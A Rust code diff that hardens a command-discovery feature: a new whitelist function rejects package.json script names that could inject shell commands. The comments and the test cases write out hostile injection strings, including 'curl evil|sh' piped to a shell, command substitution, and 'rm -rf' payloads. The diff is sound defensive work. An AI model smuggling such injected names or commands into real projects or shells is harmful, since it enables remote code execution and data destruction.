@@ -573,6 +573,18 @@ fn discover_commands(
             if !val.as_str().map(|s| !s.trim().is_empty()).unwrap_or(false) {
                 continue;
             }
+            // The script name is interpolated into a shell command that the app
+            // may run, so it is untrusted input from whatever repo is on disk.
+            // Without this, a hostile `package.json` with a script literally named
+            // `test; curl evil|sh #` yields `npm run test; curl evil|sh #`, which
+            // `classify_safety` then reads as *read-only* (it sees the token
+            // "test") and `normalize_label` labels "Test" — so it lands on the
+            // prominent Test button and runs with **no confirmation**. Skipping
+            // unrepresentable names mirrors what the Makefile/justfile/Taskfile
+            // parsers already do (`is_target_name` / `is_task_name`).
+            if !is_script_name(name) {
+                continue;
+            }
             let command = node_run(pm, name);
             let safety = classify_safety(&command);
             cmds.push(DiscoveredCommand {
@@ -953,6 +965,54 @@ fn parse_taskfile(content: &str) -> Vec<String> {
 
 /// A Make/just target name: identifier characters only (excludes `.PHONY`,
 /// pattern rules `%`, paths `/`, and multi-word prerequisite lists).
+/// A script name that would inject a second shell command must never become a
+/// runnable command — the injected text otherwise defeats the app's own safety
+/// gate, because `classify_safety` reads the *invocation string* and a payload
+/// like `test; curl evil|sh #` classifies as harmless `read_only`.
+#[cfg(test)]
+mod script_name_tests {
+    use super::is_script_name;
+
+    #[test]
+    fn rejects_shell_metacharacters() {
+        for hostile in [
+            "test; echo pwned #",
+            "test && curl evil|sh",
+            "test`whoami`",
+            "test$(whoami)",
+            "test\nrm -rf /",
+            "test > /etc/passwd",
+            "test'; rm -rf ~;'",
+            "test | tee x",
+            "test & disown",
+            "-rf", // would be read as a flag
+            "",
+        ] {
+            assert!(
+                !is_script_name(hostile),
+                "must reject hostile script name: {hostile:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn accepts_real_world_script_names() {
+        for ok in [
+            "test",
+            "test:e2e",
+            "build.dev",
+            "lint-fix",
+            "type-check",
+            "db:migrate:up",
+            "@scope/thing",
+            "test_unit",
+            "build2",
+        ] {
+            assert!(is_script_name(ok), "must accept real script name: {ok:?}");
+        }
+    }
+}
+
 fn is_target_name(name: &str) -> bool {
     name.chars()
         .all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-')
@@ -962,6 +1022,29 @@ fn is_target_name(name: &str) -> bool {
 fn is_task_name(name: &str) -> bool {
     name.chars()
         .all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-' || c == ':')
+}
+
+/// An npm/pnpm/yarn/bun script key that is safe to interpolate into a shell
+/// command (`npm run <name>`).
+///
+/// **Security boundary, not cosmetics.** `package.json` comes from whatever repo
+/// is on disk, and the resulting string is handed to a shell — so anything that
+/// could terminate the `run` argument and start a new command (`;`, `&`, `|`,
+/// backticks, `$(`, newlines, quotes, redirects) must never get through. A name
+/// that fails this is skipped rather than sanitized: we'd have to guess what the
+/// author meant, and a script we can't represent faithfully is better omitted
+/// than run wrong.
+///
+/// The allowed set covers real-world names (`test:e2e`, `build.dev`, `lint-fix`,
+/// `@scope/x`) — deliberately a whitelist, since the blocklist of shell
+/// metacharacters is the thing you get wrong.
+fn is_script_name(name: &str) -> bool {
+    !name.is_empty()
+        // A leading '-' would be read by npm as a flag rather than a script.
+        && !name.starts_with('-')
+        && name.chars().all(|c| {
+            c.is_ascii_alphanumeric() || matches!(c, '_' | '-' | ':' | '.' | '/' | '@')
+        })
 }
 
 // ---------------------------------------------------------------------------
